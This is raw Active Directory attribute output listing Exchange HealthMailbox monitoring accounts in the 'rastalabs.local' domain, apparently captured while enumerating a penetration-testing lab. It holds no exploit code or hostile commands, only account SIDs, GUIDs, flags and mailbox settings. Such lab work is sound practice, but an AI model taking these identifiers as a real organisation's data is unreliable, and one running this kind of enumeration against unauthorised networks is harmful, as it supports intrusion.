msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=f1d60baa287445ecaf70d3a28ca22b8d-HealthMailboxd
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
displayname                           : HealthMailbox-mx01-002
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25226
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:25:09
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 15/10/2017 15:25:09
whenchanged                           : 15/10/2017 14:25:20
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailboxd829eae631a0452eb9c4452736e6ce44,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {155, 140, 186, 74...}
cn                                    : HealthMailboxd829eae631a0452eb9c4452736e6ce44
msexchbypassaudit                     : False
mailnickname                          : HealthMailboxd829eae631a0452eb9c4452736e6ce44
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailboxd829eae631a0452eb9c4452736e6ce44
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailboxb517d4c57e9741308269d1fcaef920fd@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {165, 143, 67, 127...}
logoncount                            : 0
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailboxb517d4c
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
userprincipalname                     : HealthMailboxb517d4c57e9741308269d1fcaef920fd@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailboxb517d4c57e9741308269d1fcaef920fd@rastalabs.local, 
                                        SIP:HealthMailboxb517d4c57e9741308269d1fcaef920fd@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 25254
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-003
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1142
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : 59a3e4f9-63b0-4f02-87d4-8595fbc04889
whencreated                           : 15/10/2017 14:25:19
msexchumdtmfmap                       : {emailAddress:432584624526925173425739741308269313223392033, 
                                        lastNameFirstName:43258462452696901003, firstNameLastName:43258462452696901003}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=d56cf8de12ed44ac972621d4b0e2d403-HealthMailboxb
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
displayname                           : HealthMailbox-mx01-003
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25237
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:25:19
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 15/10/2017 15:25:19
whenchanged                           : 15/10/2017 14:25:31
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailboxb517d4c57e9741308269d1fcaef920fd,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {110, 115, 248, 73...}
cn                                    : HealthMailboxb517d4c57e9741308269d1fcaef920fd
msexchbypassaudit                     : False
mailnickname                          : HealthMailboxb517d4c57e9741308269d1fcaef920fd
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailboxb517d4c57e9741308269d1fcaef920fd
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailbox98ed438ffda14439a45b9c0714a0e601@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {145, 152, 220, 51...}
logoncount                            : 0
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailbox98ed438
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
userprincipalname                     : HealthMailbox98ed438ffda14439a45b9c0714a0e601@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailbox98ed438ffda14439a45b9c0714a0e601@rastalabs.local, 
                                        SIP:HealthMailbox98ed438ffda14439a45b9c0714a0e601@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 25266
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-004
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1143
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : e624fb1a-736d-43c2-bb52-76f3a3ac9755
whencreated                           : 15/10/2017 14:25:30
msexchumdtmfmap                       : {emailAddress:432584624526998334383332144392452920714203601, 
                                        lastNameFirstName:43258462452696901004, firstNameLastName:43258462452696901004}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=ec83d88202dc4cb88eb20cffd7b14a9b-HealthMailbox9
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
displayname                           : HealthMailbox-mx01-004
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25249
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:25:30
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 15/10/2017 15:25:30
whenchanged                           : 15/10/2017 14:25:40
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailbox98ed438ffda14439a45b9c0714a0e601,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {127, 246, 212, 244...}
cn                                    : HealthMailbox98ed438ffda14439a45b9c0714a0e601
msexchbypassaudit                     : False
mailnickname                          : HealthMailbox98ed438ffda14439a45b9c0714a0e601
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailbox98ed438ffda14439a45b9c0714a0e601
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailboxdba7dad0a8e14f89a8404d88caee8cca@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {226, 113, 121, 205...}
logoncount                            : 0
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailboxdba7dad
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
userprincipalname                     : HealthMailboxdba7dad0a8e14f89a8404d88caee8cca@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailboxdba7dad0a8e14f89a8404d88caee8cca@rastalabs.local, 
                                        SIP:HealthMailboxdba7dad0a8e14f89a8404d88caee8cca@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 25278
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-005
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1144
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : 79a10b60-a264-42da-b22e-a21a69cbd840
whencreated                           : 15/10/2017 14:25:40
msexchumdtmfmap                       : {emailAddress:432584624526932273230283143892840438822338222, 
                                        lastNameFirstName:43258462452696901005, firstNameLastName:43258462452696901005}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=2c589f09473043c198b6b573eb12032f-HealthMailboxd
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
displayname                           : HealthMailbox-mx01-005
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25261
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:25:40
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 15/10/2017 15:25:40
whenchanged                           : 15/10/2017 14:25:51
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailboxdba7dad0a8e14f89a8404d88caee8cca,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {110, 111, 244, 215...}
cn                                    : HealthMailboxdba7dad0a8e14f89a8404d88caee8cca
msexchbypassaudit                     : False
mailnickname                          : HealthMailboxdba7dad0a8e14f89a8404d88caee8cca
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailboxdba7dad0a8e14f89a8404d88caee8cca
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailbox0f17b3de090543038fb1722cfd1bb3a8@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {16, 3, 140, 5...}
logoncount                            : 0
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailbox0f17b3d
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
userprincipalname                     : HealthMailbox0f17b3de090543038fb1722cfd1bb3a8@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailbox0f17b3de090543038fb1722cfd1bb3a8@rastalabs.local, 
                                        SIP:HealthMailbox0f17b3de090543038fb1722cfd1bb3a8@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 25280
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-006
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1145
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : 5c82658e-e010-48a8-adc3-898a7b9a757f
whencreated                           : 15/10/2017 14:25:50
msexchumdtmfmap                       : {emailAddress:432584624526903172333090543038321722233122328, 
                                        lastNameFirstName:43258462452696901006, firstNameLastName:43258462452696901006}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=c5f46036b90341ff960d88079875bb84-HealthMailbox0
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
displayname                           : HealthMailbox-mx01-006
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25273
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:25:50
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 15/10/2017 15:25:50
whenchanged                           : 15/10/2017 14:26:01
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailbox0f17b3de090543038fb1722cfd1bb3a8,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {164, 19, 235, 27...}
cn                                    : HealthMailbox0f17b3de090543038fb1722cfd1bb3a8
msexchbypassaudit                     : False
mailnickname                          : HealthMailbox0f17b3de090543038fb1722cfd1bb3a8
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailbox0f17b3de090543038fb1722cfd1bb3a8
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailbox0cca36330a91458bb985ce2579146ccf@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {25, 209, 110, 197...}
logoncount                            : 0
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailbox0cca363
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
userprincipalname                     : HealthMailbox0cca36330a91458bb985ce2579146ccf@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailbox0cca36330a91458bb985ce2579146ccf@rastalabs.local, 
                                        SIP:HealthMailbox0cca36330a91458bb985ce2579146ccf@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 25302
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-007
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1146
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : b77df92e-cef7-4912-82a6-47bc08aab706
whencreated                           : 15/10/2017 14:26:01
msexchumdtmfmap                       : {emailAddress:432584624526902223633029145822985232579146223, 
                                        lastNameFirstName:43258462452696901007, firstNameLastName:43258462452696901007}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=56c31a85ab994d4e8d8f49c236d634cd-HealthMailbox0
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
displayname                           : HealthMailbox-mx01-007
msexchhomeservername                  : /o=RastaLabs/ou=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit         : 7776000
usncreated                            : 25286
msexchelcmailboxflags                 : 2
msexchwhenmailboxcreated              : 15/10/2017 14:26:01
msexcharchivequota                    : 104857600
internetencoding                      : 0
msexchcalendarloggingquota            : 6291456
msexchtransportrecipientsettingsflags : 0
msexchdumpsterquota                   : 31457280
pwdlastset                            : 15/10/2017 15:26:01
whenchanged                           : 15/10/2017 14:26:12
showinaddressbook                     : CN=All Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
distinguishedname                     : CN=HealthMailbox0cca36330a91458bb985ce2579146ccf,CN=Monitoring 
                                        Mailboxes,CN=Microsoft Exchange System Objects,DC=rastalabs,DC=local
msexcharchiveguid                     : {242, 89, 94, 100...}
cn                                    : HealthMailbox0cca36330a91458bb985ce2579146ccf
msexchbypassaudit                     : False
mailnickname                          : HealthMailbox0cca36330a91458bb985ce2579146ccf
objectclass                           : {top, person, organizationalPerson, user}
msexcharchivewarnquota                : 94371840
msexchmdbrulesquota                   : 256
msexchmailboxtemplatelink             : CN=Default MRM Policy,CN=Retention Policies 
                                        Container,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchpoliciesincluded                : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                 : 0
msexchumenabledflags2                 : -1
name                                  : HealthMailbox0cca36330a91458bb985ce2579146ccf
accountexpires                        : NEVER
msexchrecipienttypedetails            : 549755813888
msexchgroupsecurityflags              : 0
primarygroupid                        : 513

mail                                  : HealthMailbox3302aa9f11af4986b0bd16abdcb40a91@rastalabs.local
instancetype                          : 4
msexchmailboxguid                     : {28, 11, 157, 181...}
logoncount                            : 0
codepage                              : 0
msexcharchivedatabaselink             : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
homemdb                               : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                        (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists            : True
msexchdumpsterwarningquota            : 20971520
samaccountname                        : HealthMailbox3302aa9
countrycode                           : 0
protocolsettings                      : RemotePowerShell?1
userprincipalname                     : HealthMailbox3302aa9f11af4986b0bd16abdcb40a91@rastalabs.local
proxyaddresses                        : {SMTP:HealthMailbox3302aa9f11af4986b0bd16abdcb40a91@rastalabs.local, 
                                        SIP:HealthMailbox3302aa9f11af4986b0bd16abdcb40a91@rastalabs.local}
useraccountcontrol                    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                            : 25314
dscorepropagationdata                 : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 
                                        06:40:55...}
lastlogoff                            : 01/01/1601 00:00:00
badpasswordtime                       : 01/01/1601 00:00:00
mdbusedefaults                        : True
msexchmailboxsecuritydescriptor       : {1, 0, 4, 128...}
msexcharchivename                     : In-Place Archive - HealthMailbox-mx01-008
msexchrecipientsoftdeletedstatus      : 0
msexchuseraccountcontrol              : 0
msexchaddressbookflags                : 1
badpwdcount                           : 0
msexchmailboxauditenable              : False
objectsid                             : S-1-5-21-1396373213-2872852198-2033860859-1147
msexchprovisioningflags               : 0
samaccounttype                        : USER_OBJECT
lastlogon                             : 01/01/1601 00:00:00
msexchrbacpolicylink                  : CN=Default Role Assignment 
                                        Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                        Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                         : 88218628259840
objectguid                            : 20938aa9-6da5-4a8a-8624-f5f5750bb83c
whencreated                           : 15/10/2017 14:26:11
msexchumdtmfmap                       : {emailAddress:432584624526933022293112349862023162232240291, 
                                        lastNameFirstName:43258462452696901008, firstNameLastName:43258462452696901008}
msexchtextmessagingstate              : {302120705, 16842751}
legacyexchangedn                      : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/c
                                        n=19954eb807aa49f89d8cbee7f3814f53-HealthMailbox3
garbagecollperiod                     : 1209600
msexchpoliciesexcluded                : {26491cfc-9e50-4857-861b-0cb8df22b5d7}
displayname                           : HealthMailbox-mx01-008
